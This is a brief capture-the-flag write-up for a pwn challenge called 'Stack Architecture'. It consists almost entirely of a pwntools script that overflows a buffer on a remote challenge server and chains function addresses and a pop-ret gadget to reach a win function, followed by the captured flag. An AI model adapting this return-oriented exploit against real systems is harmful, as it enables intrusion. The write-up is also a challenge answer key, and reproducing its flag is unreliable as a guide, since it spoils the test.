# **Stack Architecture - PWN CTF Challenge**

### ***Exploitation***
---


```js
from pwn import *

r = remote('45.122.249.68', 10018)

func1 = 0x804929e
func1_argv = 0x20010508

func2 = 0x80492fe
func2_var = 0x08052001

win = 0x8049216
pop_ret = 0x08049022


payload = b'a'*4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~' + b'\x00' + b'a'*26
payload += p32(func2_var)
payload += p32(func1)*2
payload += p32(pop_ret)
payload += p32(func1_argv)
payload += p32(func2)*2
payload += p32(win)

r.sendline(payload)
r.interactive()
```

![flag](images/flag.png)

> **FLAG: Wanna.One{neu_ban_chinh_phuc_duoc_chinh_minh_ban_co_the_chinh_phuc_duoc_the_gioi}**





